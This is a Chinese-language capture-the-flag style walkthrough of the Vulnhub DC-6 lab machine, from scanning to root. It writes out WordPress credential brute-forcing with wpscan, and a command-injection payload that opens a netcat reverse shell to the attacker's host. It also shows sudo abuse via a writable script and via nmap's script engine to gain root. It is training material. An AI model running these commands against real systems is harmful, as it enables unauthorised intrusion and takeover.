Vulnhub--DC-6

Vulnhub--DC-6
2022-12-22 10:07:04

一，部署方法

在官网上下载zip压缩包

下载到本地上解压缩后使用虚拟机导入.ova后缀的文件（在过程中出现问题不用理睬，点击重试即可）

配置网络，本人设置的是nat模式，这个看个人需求

打开靶机即可

二，靶机地址和描述

 1. 下载地址

https://download.vulnhub.com/dc/DC-6.zip

 1. 靶机描述

三，测试

1. 信息收集

使用

arp-scan -l

扫描网段

发现148为攻击机的地址，150是靶机的地址

使用

nmap -A -T4 -p- 192.168.237.150

进行深度探测靶机

发现靶机开启了22端口，ssh服务.80端口，http服务

尝试访问靶机的80端口，发现并无此服务器，想到靶机说明中的提示

需要进行配置攻击机的Hosts

使用

vi /etc/hosts

添加对应的映射

重新访问靶机环境

访问成功，查看网页没有任何发现，进行网站的目录扫描

dirb http://192.168.237.150/

发现后台登录地址

http://192.168.237.150/wp-admin

访问查看

发现登陆地址为/wp-login.php

因为信息收集中发现网站的CMS是wordpress的，使用针对于wordpress站点的漏扫工具wpscan进行爆破。

2. 使用wpscan爆破网站的用户名和密码

首先爆破站点存在的漏洞

wpscan --url http://wordy/ --enumerate vt

没有发现漏洞

进行爆破站点的用户名

wpscan --url http://wordy/ --enumerate u

爆破出五个用户名，将这五个用户名保存在文件user.txt中

vi user.txt

这里为了节省时间，使用kali中自带的密码字典，并且在靶机介绍中告诉我们密码字典的位置

使用

cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt

发现无此文件，进行下面的操作

cd /usr/share/wordlists

ls

gunzip rockyou.txt.gz

ls

cd ~

cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt

这时就可以进行用户名和密码的爆破了

使用

wpscan --url http://wordy/ -U user.txt -P passwords.txt

爆破出来用户名和密码:mark/helpdesk01

进行登录站点

成功进行登录。

遍历站点功能点后发现在lookup处有点小意思

在IP处输入127.0.0.1，点击lookup

发现在上面出现回显。

尝试进行命令执行 127.0.0.1 | ls

成功执行命令，这里可以使用命令执行漏洞进行getshell。

3. Getshell

再次点击lookup进行抓包

将数据包发送到Repeater模块

改变数据包中的字段，将靶机的shell反弹到攻击机上

127.0.0.1 | nc 192.168.237.148 4444 -e /bin/bash

在此之前在攻击机上打开监听

nc -lvvp 4444

成功反弹shell

使用

python -c ‘import pty;pty.spawn(“/bin/bash”)’

打开交互性shell

查看权限

为最低权限。

查看靶机中的内容

cd /home

ls

首先查看家目录下的内容，发现有四个目录，进行查看

此处省略查看四个目录的过程，梳理一下收获到的信息。

在jens目录下存在backups.sh的脚本文件，进行查看

查看权限

发现可执行，执行后发现并无任何作用，于是搁置一边。

在mark目录下发现stuff目录，进入后发现存在things-to-do.txt文件，进行查看

发现一个新的用户名和密码：graham/GSo7isUM1D4

这里怀疑是开启的ssh的服务的用户名和密码，使用ssh进行登录。

4. ssh登录

成功进行ssh服务登录，发现现在是graham用户的权限下

使用

sudo -l

查看可使用的特权命令

发现jens用户下的/home/jens/backups.sh不用密码就可以执行

刚才查看过这个文件，尝试进行命令写入反弹jens用户的shell

pwd

cd ..

cd jens

写入命令

echo “/bin/bash” >> backups.sh

cat backups.sh

写入命令

以管理员身份进行执行该文件

sudo -u jens ./backups.sh

发现切换到了jens的用户下。

从jens用户下查找特权命令

sudo -l

发现在jens目录下存在root无密码可执行的文件/usr/bin/nmap，这里尝试使用nmap提权

5. 提权

首先写一个shell的脚本文件，将这个脚本文件使用nmap进行执行

echo 'os.execute("/bin/bash")' >> shell

sudo nmap --script=shell

发现成功提权，

切换到root的目录下进行查看

cd /root

ls

cat theflag.txt

【值得注意的是：这里输入的命令不会回显，但是在回车的时候会被执行，所以可以正常输入】

成功

四，总结

信息收集

根据CMS是wordpress使用wpscan工具进行爆破用户名和密码

nc反弹shell

ssh服务远程链接

进行靶机内的信息收集很重要！！！

nmap提权!
